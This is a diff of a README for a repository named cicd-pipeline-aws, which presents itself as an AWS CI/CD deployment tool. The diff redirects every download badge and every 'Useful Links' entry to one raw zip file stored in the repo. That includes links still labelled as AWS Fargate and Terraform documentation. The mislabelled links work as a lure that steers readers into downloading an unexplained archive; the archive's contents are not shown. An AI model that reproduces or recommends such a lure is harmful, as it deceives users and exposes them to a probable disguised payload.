@@ -1,6 +1,6 @@
 # ⚙️ cicd-pipeline-aws - Easy CI/CD Deployment on AWS
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip)
 
 ## 📋 About cicd-pipeline-aws
 
@@ -47,7 +47,7 @@ This section guides you through downloading and running the application on Windo
 
 Click on the button below to visit the releases page and get the latest version of the software. This page lists all available versions and files.
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip)
 
 1. Open the link in your browser.
 2. Find the newest release (top of the list).
@@ -157,11 +157,11 @@ For help or questions, use the issue tracker on the GitHub page. Provide details
 
 ## 🔗 Useful Links
 
-- GitHub Releases: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/releases
-- GitHub Repository: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws
-- AWS ECS Fargate Intro: https://aws.amazon.com/fargate/
-- Terraform Documentation: https://www.terraform.io/docs/
+- GitHub Releases: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
+- GitHub Repository: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
+- AWS ECS Fargate Intro: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
+- Terraform Documentation: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-green)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-green)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip)
